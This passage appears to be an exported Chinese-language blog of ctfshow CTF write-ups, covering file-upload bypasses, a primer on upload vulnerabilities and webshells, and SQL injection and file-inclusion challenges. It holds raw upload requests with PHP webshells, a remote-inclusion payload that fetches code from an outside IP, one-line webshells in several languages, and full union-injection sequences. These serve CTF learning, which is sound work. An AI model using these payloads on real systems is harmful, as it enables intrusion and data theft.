https://fe1b607e-5063-4a37-b0d2-c72875564f04.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: corsPOST /upload.php HTTP/1.1\nHost: 026c91d8-ea21-495f-8792-cbcc72ba4665.challenge.ctf.show\nContent-Length: 300\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: <?php eval($_POST['cmd']);?>\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryppBxOKqhhE8RaLUp\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://026c91d8-ea21-495f-8792-cbcc72ba4665.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://026c91d8-ea21-495f-8792-cbcc72ba4665.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryppBxOKqhhE8RaLUp\nContent-Disposition: form-data; name=\"file\"; filename=\"txt\"\nContent-Type: image/png\n\nGIF89a\n<?=$a=\"l\"?><?=$b=\"o\"?><?=$c=\"g\"?><?=$d=\"]\"?><?=$e=\"s\"?><?=$f=$d^$e?>\n<?=include\"/var/$a$b$c/nginx/access$f$a$b$c\"?>\n------WebKitFormBoundaryppBxOKqhhE8RaLUp--\n\nSec-Fetch-Dest: empty\nReferer: https://fe1b607e-5063-4a37-b0d2-c72875564f04.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryA8nhZc4rf82KOfXq\nContent-Disposition: form-data; name=\"file\"; filename=\"png\"\nContent-Type: image/png\n\nGIF89a\n<?=$a=\"l\"?><?=$b=\"o\"?><?=$c=\"g\"?><?=$d=\"]\"?><?=$e=\"s\"?><?=$f=$d^$e?>\n<?=include\"/var/$a$b$c/nginx/access$f$a$b$c\"?>\n------WebKitFormBoundaryA8nhZc4rf82KOfXq--\n\n```\n\n访问后就可以看到日志文件了，UA头写马就行了\n\n这里也可以使用远程文件包含，上传.user.ini,需要把ip转换为数字，我们试一下\n\n```\nPOST /upload.php HTTP/1.1\nHost: a8fb8d01-36e2-48fc-bd78-50edeedfed2c.challenge.ctf.show\nContent-Length: 220\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary89S7jEhpfrVMyFIj\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://a8fb8d01-36e2-48fc-bd78-50edeedfed2c.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://a8fb8d01-36e2-48fc-bd78-50edeedfed2c.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundary89S7jEhpfrVMyFIj\nContent-Disposition: form-data; name=\"file\"; filename=\"png\"\nContent-Type: image/png\n\nGIF89a\n<?=include\"http://2632902999/text\"?>\n------WebKitFormBoundary89S7jEhpfrVMyFIj--\n\n```\n\n然后在云服务器的web目录中设置文件text\n\n```\n<?php system('ls ..');?>\n```\n\n查看上级目录的文件，保存发包后访问被包含的文件/upload/index.php\n\n![image-20250315111441901](../image/achieve/202411/文件上传--ctfshow/image-20250315111441901.png)\n\n\n\n可以看到出来了\n\n因为这里是远程包含的，所以直接把text改一下就行，不需要重复发包\n\n这里还可以用session文件包含\n\n首先还是上传.user.ini文件去包含我们要创建的session文件\n\n```\nGIF89a\nauto_append_file=/tmp/sess_xxx\n```\n\nxxx为我们传入的PHPSESSID的值\n\n然后构造一个上传session文件的包传入**SESSION_UPLOAD_PROGRESS**并修改Cookie的值为PHPSESSI=xxx，发包后访问upload/index.php就可以看到包含文件了\n\n# web163\n\n这题的话过滤是一样的，问题在于这题上传没有扩展名的文件会直接删除，系统会对文件进行检查，这就需要进行条件竞争了\n\n其实没什么区别，就是用intruder模块持续发包就行，但是好像发现.user.ini文件不会删除，那就好做了\n\n上传包\n\n```\nPOST /upload.php HTTP/1.1\nHost: ec71d5e9-8300-4c1c-81b8-3ce7b3da64a2.challenge.ctf.show\nContent-Length: 230\nSec-Ch-Ua-Platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nSec-Ch-Ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryfI7ELFWERrgLQD22\nSec-Ch-Ua-Mobile: ?0\nOrigin: https://ec71d5e9-8300-4c1c-81b8-3ce7b3da64a2.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://ec71d5e9-8300-4c1c-81b8-3ce7b3da64a2.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nPriority: u=1, i\nConnection: keep-alive\n\n------WebKitFormBoundaryfI7ELFWERrgLQD22\nContent-Disposition: form-data; name=\"file\"; filename=\".user.ini\"\nContent-Type: image/png\n\nGIF89a\nauto_prepend_file=http://2632902999/text\n------WebKitFormBoundaryfI7ELFWERrgLQD22--\n\n```\n\n如果正常传的话web163 与 web162 略微有点区别，web163 在上传 `指定包含文件`的时候，会立即删除，这里我们需要进行竞争。爆破一直发送。\n","tags":["文件上传"],"categories":["ctfshow"]},{"title":"文件上传的一些积累","url":"/2025/03/11/文件上传的一些积累/","content":"\n# 文件上传漏洞是什么？\n\n**文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。**“文件上传”本身并没有问题，但是关键在于服务器怎么去处理上传的文件，如果服务器对上传的文件处理不够到位，没有做到一些恶意代码的过滤，就会导致很严重的后果\n\n所以文件上传漏洞的利用条件就是\n\n- 上传一个可执行文件或者恶意木马文件\n- 服务器解析不合理，导致文件成功执行\n\n需要额外注意的是，我们上传的文件需要可以被脚本语言所解析执行\n\n- 说明一：如果对方服务器运行的是PHP环境，你不能上传一个JAVA的后门代码\n- 说明二：上传文件的目录可以被脚本语言解析执行，如果没有执行权限也不行\n- 说明三：一般文件上传后会返回一个地址，如果无法连接到也不能构成文件上传漏洞\n\n1. **文件上传漏洞常存在的地方**就是网站中任何可以上传文件的地方例如上传头像，上传文档的口子\n\n那么我们上传的文件通常就是webshell，后门文件\n\n# webshell是什么？\n\n具体的直接看文章\n\n[一文详解Webshell](https://www.freebuf.com/articles/web/235651.html)\n\n**Webshell是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等**其实就是一种网页后门，通常用php，asp或jsp去编写\n\n## 常见的一句话木马\n\n- PHP\n\n```\n<?php eval($_GET['x'])?>\n<?php assert($_POST['x']);?>\n<?php eval($_POST['x'])?>\nx就是我们传入的参数，也就是蚁剑的密码\n```\n\n- ASP\n\n```\n<%eval request(\"x\")%>   \n<%execute request(\"x\")%>\n```\n\n- JSP\n\n```\n<%Runtime.getRuntime().exec(request.getParameter(\"x\"));%>\n```\n\n\n\n# 文件上传的攻击方法\n\n在目标网站中找到可以上传文件的地方->尝试上传.php .aspx等动态脚本语言文件测试其是否可以直接上传->需要绕过的地方进行绕过\n\n# 文件上传校验以及绕过姿势\n\n参考文章https://cloud.tencent.com/developer/article/1938541\n\n分为前端(客户端)和后端(服务端)\n\n![img](../image/achieve/202411/文件上传的一些积累/1.png)\n\n## 客户端前端JavaScript校验\n\nWeb应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。\n\n前端的验证通常只有对文件后缀名进行验证，通常可以通过以下两个方法去绕过\n\n- 禁用浏览器JavaScript功能\n\n从根源解决问题，如果JS被禁用了，那么前端的JavaScript校验就失效了，此时我们就可以正常上传恶意文件\n\n- 在当前网站源码中删除相应的JavaScript代码\n\n- BP上传改包\n\n例如一个只存在前端校验的网站要求我们上传png文件，此时我们可以先将我们的恶意文件的后缀名改成png，然后在上传的时候将请求包用BP抓包，在请求包中将后缀名改成可以被web服务器解析的后缀名，达到一个绕过前端验证的效果\n\n如何判断当前页面使用前端is的验证方式:\n\n>    前端验证通过以后，表单成功提交后会通过浏览器发出─条网络请求，但是如果前端验证不成功，则不会发出这项网络请求;可以在浏览器的网络元素中查看是否发出了网络请求。\n\n## 服务端后端校验\n\n## 扩展名检测\n\n通常是针对文件的扩展名后缀进行检测，主要是通过黑白名单进行过滤检测，如果不符全过滤规则则不允许上传。\n\n首先是关于后缀名的解析漏洞\n\n### 黑白名单检测绕过方法\n\n黑名单就是对某些后缀名开启了过滤，要求只要是这些后缀名的文件都不被允许上传，例如upload-labs靶场的Pass-03\n\n![image-20250312165347011](../image/achieve/202411/文件上传的一些积累/image-20250312165347011.png)\n\n### 服务器解析漏洞\n\n#### Apache解析漏洞\n\n漏洞原理\n\n`Apache` 解析文件的规则是`从右到左`开始判断解析，如果`后缀名`为`不可识别`文件解析，就再往左判断。比如`test.php.a.b`的“`.a`”和“`.b`”这两种后缀是`apache`不可识别解析，`apache`就会把`test.php.a.b`解析成`test.php`。\n\n影响版本\n\n```\napache 1.x  apache 2.2.x\n```\n\n#### .htaccess文件解析漏洞\n\n**前提条件**：Apache 的 AllowOverride 指令来设置启动.htaccess文件的使用\n\nhtaccess 文件是一种用于 Apache Web 服务器的配置文件，它允许网站管理员对网站的访问权限、重写规则（URL 重写）、错误页面处理、MIME 类型设置以及其他服务器配置进行精细控制。这个文件通常位于网站的根目录或子目录中，并且其名称前面的点（.）表示它是一个隐藏文件，在大多数操作系统中默认不会显示。\n\n需要注意，.htaccess文件的作用域为其所在目录与其所有的子目录，若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。\n\n如果**Web服务器是Apache**且**黑名单没有对.htaccess做限制**，那么可以上传.htaccess配置文件到目录中覆盖Apache的设置，可以通过配置执行webshell。\n\n.htaccess 常见指令\n\n- **AddType 指令**\n\n```\nAddType application/x-httpd-php .jpeg .png\n```\n\n**AddType 指令可以将给定的文件扩展名映射到指定的内容类型。**\n\n这个指令的主要作用是文件上传时候如果我们上传一个后缀为png或者jpeg的文件，当它们被访问时，应该用PHP解析器来解析。意味着我们可以通过在这些后缀的文件中插入恶意php代码去达到我们的进攻目的\n\n或者也可以这样设置\n\n- **SetHandler指令**\n\n```\nplaintext\nSetHandler application/x-httpd-php\n```\n\n**SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理。**\n\n这个指令的主要作用是告诉 Apache，任何匹配的文件都应该通过 PHP 处理器来处理。当前目录及其子目录下所有文件都会被当做 php 解析。\n\n攻击方法\n\n如果我们的黑名单对所有php文件都进行了严格过滤，前面的绕过行不通，那么我们可以利用.htaccess文件的指令让Apache去执行我们的php文件，例如\n上传一个.htaccess文件去覆盖原有的配置，文件内容:\n\n```\nAddType application/x-httpd-php .jpeg .png\n```\n\n我们可以上传一个后缀名为png或者jpeg的一句话木马，上传后Apache会根据配置文件里指定的后缀名文件按照php去解析执行，从而达到一个文件上传getshell的效果\n\n#### .user.ini文件解析漏洞\n\n首先了解一下什么是.user.ini文件\n\n![image-20250308231722174](../image/achieve/202411/极客大挑战2020/image-20250308231722174-1741770512855-6.png).user.ini 是 PHP 的用户级配置文件。这个文件允许用户在特定目录中自定义一些 PHP 配置选项，以覆盖全局 PHP 配置。\n\n```\nauto_prepend_file=top.html   ; 指定一个文件，自动包含在要执行的文件前。\nauto_append_file=down.html  ; 指定一个文件，自动包含在要执行的文件后。\n```\n\n`.user.ini`和`.htaccess`一样是对当前目录的所以`php`文件的配置设置，即写了`.user.ini`和它同目录的文件会优先使用`.user.ini`中设置的配置属性。\n\n攻击方法\n\n为了利用auto_append_file，我们首先上传.user.ini内容为 `auto_append_file=“xxx”` xxx为我们上传的文件名，接着上传一个带木马的文件(根据黑名单过滤来确定可上传文件后缀名) 因为upload有php文件，所以这个php就会添加一个include(“shell.png”)，就会包含到木马,这样就在每个php文件上包含了我们的木马文件。\n\n#### 目录解析漏洞\n\n在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了\n\n#### 文件解析漏洞\n\n在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 a.asp;.jpg 会被服务器看成是a.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa  .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。\n\n#### IIS7.0 | IIS7.5 的解析漏洞\n\n其实就是nginx对文件的检索规则，举个例子，当php遇到文件路径/1.jpg/2.txt/3.php时，若/1.jpg/2.txt/3.php不存在，则会去掉最后的/3.php，然后判断/1.jpg/2.txt是否存在，若存在，则把/1.jpg/2.txt当做文件/1.jpg/2.txt/3.php，若/1.jpg/2.txt仍不存在，则继续去掉/2.txt，以此类推。\n\n### Windows下绕过后缀名验证\n\n基于windows特性，同样的使用 1.php. . 1.php空格 1.php.空格  1.php::$DATA等格式都可以，可以绕过黑名单，也能让文件最终保存为 1.php 。\n\n### 后缀名空格绕过\n\nwindows系统中，在文件名后面留一个空格，然后上传上去后空格会被自动的省略，对于有些过滤规则来说有没有空格是不一样的，但是对于操作系统来说，文件名的最后一个是空格会直接将其删除。\n\n### 后缀名大小写绕过\n\n- 文件后缀名大小写绕过：例如`*.Php`，`*.Jsp`\n\n大小写绕过原理：windows系统下，对于文件名中的大小写不敏感，例如：text.php和Test.PHP是一样的，但是linux系统下。对于文件名中的大小写敏感。例如text.php和TexT.php就是不一样的\n 基于windows可以上传一些安全漏洞\n\n### 后缀名双写绕过\n\n- 文件后缀名双写绕过：例如`*.pphphp`，检测会将中间的php过滤掉，替换成空格，然后会继续拼接成php，但这取决于检测的方法是什么样的\n\n### **可解析后缀绕过**\n\n```\nasp: asa cer aspx\njsp: jspx jspf jspa \nphp: php php3 php4 php5 phtml pht \nexe: exee \n```\n\n### Windows命名机制绕过后缀\n\n- 特殊文件后缀名绕过：**利用Windows的命名机制**，修改数据包里的文件名改为 test.php. 或者 test.asp_。在绕过上传之后windows系统会自动去掉 点和空格，但是Unix/Linux没有这个机制\n\n### %00截断绕过\n\n截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态\n\n在 PHP 中，`magic_quotes_gpc` 是一个配置选项，用于自动转义通过 GET、POST、COOKIE 等方式传递的数据。当 `magic_quotes_gpc` 的值为 `OFF` 时，PHP 不会自动对这些数据进行转义处理。\n\n原理:由于文件上传后的`路径用户可以控制`，攻击者可以利用手动添加字符串标识符`0X00`的方式来将后面的拼接的内容`进行截断`，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。\n\n攻击方法\n\n![image-20250312193825688](../image/achieve/202411/文件上传的一些积累/image-20250312193825688.png)\n\n### `\\.绕过后缀名检测`\n\n参考文章：[文件上传upload-labs 第20关 pathinfo()函数](https://blog.csdn.net/YYYYU_ZHIZZZ/article/details/134287200)\n\n如果PHP版本过高那空字符截断就无效了，只能用一个之前从未使用的方法，在两个系统环境使用有一点点区别。在windows下部署可以抓包保存文件名使用1.php/.    1.php\\.   1.php/\\.等，在linux下部署就只能用1.php/. 这个了。原因很简单，文件命名的时候 / \\ 在windows是禁止的而 / 在linux也是禁止的，所以不会出现在文件名中最终保存还是1.php文件名。但是 \\ 在linux是一个转义符号允许出现在文件名中，出现在后缀(1.php\\.)那就没什么意义了。\n\n​    关于为什么 / 后面要一个点，是因为pathinfo函数返回后缀名（最后一个点号后面的字符串）的时候会去除 / 和 \\ 。如果使用1.php/的话，那么去除 / 后返回的真实的php后缀被读取到就会黑名单匹配上。加上一个点pathinfo函数读取的就是最后的点后面的字符串，点后面是空字符串不是有效拓展名它就返回为空，空就不会匹配黑名单以达到绕过黑名单目的。\n\n​    再拓展一下 \\. 在linux的作用。如果linux下有一个文件1.php\\.的文件，使用php  1.php\\.命令去执行，那么会认为文件名是 1.php. 就会找不到这个文件。正确做法是php '1.php\\.'告诉系统 \\ 是文件名一部分而不是转义符号。\n\n## MIME 类型检测\n\nMIME 类型（Multipurpose Internet Mail Extensions， 多用途互联网邮件扩展）是一种标准，用于表示文件的类型和格式，通常用于网络传输。MIME 类型主要由两部分组成：主类型和子类型，中间用斜杠（/）分隔。\n\n常见的MIME类型:\n\n> `text/plain` （纯文本） \n>\n>  `text/html` （HTML文档）\n>\n>  `text/javascript` （js代码） \n>\n>  `application/xhtml+xml` （XHTML文档） \n>\n> `image/gif` （GIF图像） \n>\n>  `image/jpeg` （JPEG图像） \n>\n>  `image/png` （PNG图像）  \n>\n> `video/mpeg` （MPEG动画） \n>\n>  `application/octet-stream` （二进制数据）  \n>\n> `application/pdf` （PDF文档）\n\n这是在服务端的对文件头content-type的检测，大致代码实现如下\n\n```php\n//upload-labs(Pass-02)\n<?php\nif (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'))\n```\n\n在文件上传的过程中，服务端会针对我们上传的文件生成一个数组，其中有一项就是文件的类型type；根据黑白名单里和我们上传的文件的类型进行比较，符合要求才能上传文件到服务端\n\n绕过方法\n\n部分Web应用系统判定文件类型是通过`content-type字段`\n\n```\n抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的Content-Type:application/octet-stream修改为image/jpeg、image/png、image/gif等就可以\n```\n\n## 文件内容检测\n\n### 文件头类型检测\n\n在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器例如010editor打开文件，添加服务器允许的文件头以绕过检测。\n\n常见的文件头：\n\n```\ngif: GIF89a(47 49 46 38 39 61)\njpg: jpeg: FF D8 FF\npng: 89 50 4E 47 0D 0A\n在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。\n```\n\n### 对关键字的绕过\n\n- 如果过滤了php的话，我们可以换成别的一句话木马或者用短标签去进行绕过\n\n\n这里的 `<?=` 是一个完整的输出语句，它会执行 `echo eval($_POST['cmd'])` 并输出其结果。由于 `<?=` 本身就是一个输出语句，因此在这种情况下，不需要额外的分号 `;` 来结束语句。\n\n- 过滤了一句话木马中的`[]`方括号，可以用`{}`替换，在 PHP 中，使用方括号 `[]` 或花括号 `{}` 都可以用于访问数组的元素。\n\n- 过滤括号，可以用内联执行去绕过\n\n使用内联执行会将 ``内的输出作为前面命令的输入\n\n- 当命令执行跟木马上传失败的时候，可以利用日志包含上传或者直接包含文件去进行读取\n\n### getimagesize函数检测\n\n一般文件内容验证使用getimagesize函数检测会判断文件是否是一个有效的文件图片，这时候就需要我们制作图片马去进行绕过\n\n#### 图片马制作\n\n准备一张图片，这里为`a.png`，和一个一句话木马`a.php`，通过以下命令合成一个图片马`3.php`\n\n```\ncopy a.png /b + a.php /a 3.php  \n/b:指定以二进制格式复制、合并文件，用于图像或者声音类文件\n/a:指定以ascii格式复制、合并文件用于txt等文本类文件\n```\n\n**这条命令的意思是：通过`copy命令`，把`a.png`图片文件，以二进制文件形式添加到`a.php`文件中，以`ASCII文本文件`形式输出为`3.php`文件。**\n","tags":["文件上传"],"categories":["文件上传的一些积累"]},{"title":"ctfshow之web专题","url":"/2025/03/10/ctfshow之web专题/","content":"\n# 0x01前言\n\n因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的\n\n# 0x02web题目\n\n## web签到题\n\n### #源码泄露\n\n查看源代码然后拿去进行base64编码就可以拿到flag了\n\n## web2\n\n### #mysql联合注入\n\n最简单的sql注入\n\n![image-20241204212546700](./../image/achieve/202411/ctfshow--web专题/image-20241204212546700.png)\n\n进来是一个，页面源代码也没什么可用的信息，那我们就测试一下\n\n先用永真语句打一下\n\n```\nusername=1' or '1' ='1'--+&password=1\n```\n\n![image-20241204214741542](./../image/achieve/202411/ctfshow--web专题/image-20241204214741542.png)\n\n可以看到登录成功了，那我们就拿ctfshow作为账号去打一下\n\n```\n判断字段数\npassword=1&username=ctfshow' order by 3--+回显成功\npassword=1&username=ctfshow' order by 4--+回显失败\n证明是三个字段\n判断回显位置\npassword=1&username=ctfshow' union select 1,2,3--+发现2出现在了页面中，那我们用2作为回显位置去注入\n爆破数据库\npassword=1&username=ctfshow' union select 1,database(),3--+数据库名为web2\n爆破表名\npassword=1&username=ctfshow' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='web2'),3--+有flag和user两个表\n爆破flag表中字段\npassword=1&username=ctfshow' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='flag'),3--+\n爆破字段中数据\npassword=1&username=ctfshow' union select 1,(select flag from web2.flag),3--+\n\n```\n\n![image-20241204215434905](./../image/achieve/202411/ctfshow--web专题/image-20241204215434905.png)\n\n成功拿到flag！\n\n## web3\n\n### #include文件包含\n\n更简单的web题\n\n![image-20241204215643879](./../image/achieve/202411/ctfshow--web专题/image-20241204215643879.png)\n\ninclude文件包含\n\n直接用伪协议做试一下\n\n```\n?url=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n但是没什么，应该是文件名不对\n\n那我们用data伪协议去做\n\n```\ndata://text/plain,<?php system('ls');?>\n```\n\n![image-20241204220259354](./../image/achieve/202411/ctfshow--web专题/image-20241204220259354.png)\n\n读取文件\n\n```\ndata://text/plain,<?php system('tac ctf_go_go_go');?>\n```\n\n成功拿到flag\n\n这里也可以用input伪协议去做，url传入php://input，然后抓包用post传入命令或一句话木马\n\n或者也可以用日志注入，方法有很多，就不赘述了\n\n## web4\n\n### #日志注入\n\n![image-20241204220645090](./../image/achieve/202411/ctfshow--web专题/image-20241204220645090.png)\n\n和上一题一样的页面，我们先测试一下刚刚的方法能不能做\n\n好吧页面没反应，应该是过滤了，我们试试input，发现出现了error\n\n![image-20241204221123622](./../image/achieve/202411/ctfshow--web专题/image-20241204221123622.png)\n\n那就试一下日志注入吧\n\n先看一下服务器的版本\n\n![image-20241204221222472](./../image/achieve/202411/ctfshow--web专题/image-20241204221222472.png)\n\n是nginx，那就访问nginx下的access.log，url传参\n\n```\n?url=/var/log/nginx/access.log\n```\n\n![image-20241204221258839](./../image/achieve/202411/ctfshow--web专题/image-20241204221258839.png)\n\n在UA头传入一句话木马\n\n![image-20241204221511113](./../image/achieve/202411/ctfshow--web专题/image-20241204221511113.png)\n\n然后访问并用蚁剑连接\n\n![image-20241204221552019](./../image/achieve/202411/ctfshow--web专题/image-20241204221552019.png)\n\n然后在里面找flag就可以了\n\n## web5\n\n### #弱比较MD5\n\n```php+HTML\nctf.show_web5\nwhere is flag?\n<?php\nerror_reporting(0);\n    \n?>\n<html lang=\"zh-CN\">\n\n<head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0\" />\n    <title>ctf.show_web5</title>\n</head>\n<body>\n    <center>\n    <h2>ctf.show_web5</h2>\n    <hr>\n    <h3>\n    </center>\n    <?php\n        $flag=\"\";\n        $v1=$_GET['v1'];\n        $v2=$_GET['v2'];\n        if(isset($v1) && isset($v2)){\n            if(!ctype_alpha($v1)){\n                die(\"v1 error\");\n            }\n            if(!is_numeric($v2)){\n                die(\"v2 error\");\n            }\n            if(md5($v1)==md5($v2)){\n                echo $flag;\n            }\n        }else{\n        \n            echo \"where is flag?\";\n        }\n    ?>\n\n</body>\n</html>\n```\n\n我们只看里面的php代码就行了\n\n```php\n<?php\n        $flag=\"\";\n        $v1=$_GET['v1'];\n        $v2=$_GET['v2'];\n        if(isset($v1) && isset($v2)){\n            if(!ctype_alpha($v1)){\n                die(\"v1 error\");\n            }\n            if(!is_numeric($v2)){\n                die(\"v2 error\");\n            }\n            if(md5($v1)==md5($v2)){\n                echo $flag;\n            }\n        }else{\n        \n            echo \"where is flag?\";\n        }\n    ?>\n```\n\n代码分析：\n\n### `ctype_alpha($v1)`\n\n在PHP中，`ctype_alpha($v1)` 函数用于检查字符串 `$v1` 是否只包含字母字符。如果字符串中的所有字符都是字母（A-Z和a-z），则函数返回 `true`，否则返回 `false`。\n\n### is_numeric($v2)\n\n在 PHP 中，`is_numeric($v2)` 函数用于检查变量 `$v2` 的值是否为一个数字或数字字符串。如果 `$v2` 是一个数字，包括整数或浮点数，或者是表示数字的字符串（比如 `\"123\"` 或 `\"3.14\"`），则函数返回 `true`；否则返回 `false`。\n\n这里的话就是绕过md5验证，要求v1为为字母，v2为数字，并且v1与v2的md5值相同。\nPHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0\n所以只要v1与v2的md5值以0E开头即可。\n\nv1=QNKCDZO&v2=240610708\n\n这两个的md5值都是0e开头，所以他们的md5值相等\n\n### 开头为0E（MD5值碰撞）\n\n字母数字混合类型：\n\ns878926199a\n\n0e545993274517709034328855841020\n\ns155964671a\n\n0e342768416822451524974117254469\n\ns214587387a\n\n0e848240448830537924465865611904\n\ns214587387a\n\n0e848240448830537924465865611904\n\n纯大写字母：\n\nQLTHNDT\n\n0e405967825401955372549139051580\n\nQNKCDZO\n\n0e830400451993494058024219903391\n\nEEIZDOI\n\n0e782601363539291779881938479162\n\n纯数字：\n\n240610708\n\n0e462097431906509019562988736854\n\n4011627063\n0e485805687034439905938362701775\n\n4775635065\n0e998212089946640967599450361168\n\n4790555361\n0e643442214660994430134492464512  \n\n5432453531  \n0e512318699085881630861890526097\n\n5579679820\n0e877622011730221803461740184915 \n\n5585393579\n0e664357355382305805992765337023\n\n6376552501\n0e165886706997482187870215578015  \n\n7124129977 \n0e500007361044747804682122060876  \n7197546197\n0e915188576072469101457315675502\n\n7656486157      \n\n0e451569119711843337267091732412\n\n## web6\n\n### #过滤空格的联合注入\n\n![image-20241204222916746](./../image/achieve/202411/ctfshow--web专题/image-20241204222916746.png)\n\n是跟前面一样的登录界面\n\n测试一下发现好像有过滤\n\n![image-20241204223406033](./../image/achieve/202411/ctfshow--web专题/image-20241204223406033.png)\n\n出现一个sql注入错误，看看过滤了什么\n\n测试后发现过滤了空格，用内联注释绕过\n\n然后发现过滤了--+注释符号，我们换成#\n\n```\nusername=1'/**/or/**/'1'='1'#&password=1\n```\n\n![image-20241204224151511](./../image/achieve/202411/ctfshow--web专题/image-20241204224151511.png)\n\n这下可以了\n\n```\n判断字段数\nusername=ctfshow'/**/order/**/by/**/3#&password=1字段数为3\n判断回显位置\nusername=ctfshow'/**/union/**/select/**/1,2,3#&password=1还是一样2出现回显\n爆破数据库\nusername=ctfshow'/**/union/**/select/**/1,database(),3#&password=1数据库为web2\n爆破表名\nusername=ctfshow'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web2'),3#&password=1出现flag和user表\n查询flag表下字段\nusername=ctfshow'/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),3#&password=1出现flag字段\n爆flag数据\nusername=ctfshow'/**/union/**/select/**/1,(select/**/flag/**/from/**/web2.flag),3#&password=1\n```\n\n成功拿到flag\n\n## web7\n\n### #数字型+引号过滤\n\n![image-20241205133922227](./../image/achieve/202411/ctfshow--web专题/image-20241205133922227.png)\n\n不知道是啥，先点开看看，点开后发现url多了一个参数id，感觉是sql注入，而且是数字型\n\n试一下闭合单引号\n\n![image-20241205160729258](./../image/achieve/202411/ctfshow--web专题/image-20241205160729258.png)\n\n发现没变化，一开始我以为不是sql注入，后面发现是过滤了单引号,不过对题目没啥影响，只是在后面注入的时候引用名字的时候换成双引号就可以了\n\n这道题还是过滤了空格，试一下永真语句\n\n```\n?id=1/**/or/**/'1'='1'#\n```\n\n![image-20241205134649149](./../image/achieve/202411/ctfshow--web专题/image-20241205134649149.png)\n\n这里可以看到是注入成功了的\n\n我们再试一下\n\n```\n?id=1/**/or/**/1=1#\n```\n\n![image-20241205160944283](./../image/achieve/202411/ctfshow--web专题/image-20241205160944283.png)\n\n可以正常回显\n\n判断字段数\n\n```\n?id=1'/**/order/**/by/**/4#字段数是3\n```\n\n![image-20241205134800958](./../image/achieve/202411/ctfshow--web专题/image-20241205134800958.png)\n\n判断回显位置\n\n```\n?id=1/**/union/**/select/**/1,2,3#\n```\n\n![image-20241205161104960](./../image/achieve/202411/ctfshow--web专题/image-20241205161104960.png)\n\n可以看到2和3都有回显，那我们用2进行注入\n\n空格用/**/进行绕过，单引号用双引号就行\n\n```\n